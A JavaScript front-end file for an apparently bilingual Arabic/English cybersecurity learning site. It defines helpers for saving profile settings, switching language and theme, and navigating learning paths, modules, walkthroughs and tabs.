window.saveProfileSettings = function () {
  const name = document.getElementById('setting-name').value;
  const title = document.getElementById('setting-title').value;

  localStorage.setItem('user_name', name);
  localStorage.setItem('user_title', title);

  if (typeof showToast === 'function') {
    showToast(txt('تم حفظ الملف الشخصي', 'Profile saved successfully'), 'success');
  } else {
    alert(txt('تم حفظ الملف الشخصي', 'Profile saved successfully'));
  }

  // Refresh navbar to show new name
  if (typeof refreshCyberNavbar === 'function') {
    refreshCyberNavbar();
  }
}

window.changeLanguageSetting = function (lang) {
  currentLang = lang;
  localStorage.setItem('preferredLanguage', lang);

  // Update Document
  document.documentElement.lang = lang;
  document.documentElement.dir = 'ltr'; // Force LTR

  // Update Navbar
  if (typeof refreshCyberNavbar === 'function') {
    refreshCyberNavbar();
  }

  // Update Toggle Button in Header
  const toggle = document.getElementById('lang-toggle');
  if (toggle) {
    toggle.innerHTML = currentLang === 'ar' ? '<i class="fas fa-language"></i> English' : '<i class="fas fa-language"></i> العربية';
  }

  // Reload current page content
  if (typeof loadPage === 'function') {
    loadPage(currentPage);
  }
}

// 3. Theme Logic (if missing)
window.toggleTheme = function () {
  currentTheme = currentTheme === 'light' ? 'dark' : 'light';
  localStorage.setItem('theme', currentTheme);
  document.documentElement.setAttribute('data-theme', currentTheme);

  // Ensure CSS class is applied for immediate effect
  if (currentTheme === 'dark') {
    document.body.classList.add('dark-mode');
  } else {
    document.body.classList.remove('dark-mode');
  }

  // Update icon if exists
  const icon = document.getElementById('theme-icon');
  if (icon) {
    icon.className = currentTheme === 'light' ? 'fa-solid fa-moon' : 'fa-solid fa-sun';
  }

  // Update text if exists (optional reload if strictly needed, but class toggle makes it redundant)
  const btn = document.getElementById('theme-toggle-btn');
  if (btn) {
    // location.reload(); // Removed to prevent jarring reload, as CSS handles it now
  }
}

// ==========================================
// LEARN PAGE GLOBAL NAVIGATION HELPERS
// ==========================================

window.openPath = function (pathId) {
  if (typeof loadPage === 'function') {
    loadPage('lab-path-viewer', pathId);
  } else {
    console.error('loadPage is not defined');
  }
};

if (typeof window.openLearningPath === 'undefined') {
  window.openLearningPath = window.openPath;
}

window.openModule = function (moduleId) {
  if (typeof loadPage === 'function') {
    // Check if module-learning page exists, heavily preferred for new modules
    loadPage('module-learning', moduleId);
  }
};

window.openWalkthrough = function (walkthroughId) {
  if (typeof loadPage === 'function') {
    loadPage('writeup-viewer', walkthroughId);
  }
};


window.switchLearnTab = function (tabId) {
  // Hide all tabs
  document.querySelectorAll('.learn-tab-content').forEach(tab => {
    tab.classList.remove('active');
    tab.style.display = 'none';
    tab.style.opacity = '0';
  });

  // Show selected tab
  const selectedTab = document.getElementById(`content-${tabId}`);
  if (selectedTab) {
    selectedTab.style.display = 'block';
    // Force reflow
    void selectedTab.offsetWidth;
    selectedTab.classList.add('active');
    selectedTab.style.opacity = '1';
  }

  // Update buttons
  document.querySelectorAll('.learn-nav-btn').forEach(btn => {
    btn.classList.remove('active');
    if (btn.getAttribute('onclick')?.includes(tabId)) {
      btn.classList.add('active');
    }
  });
};


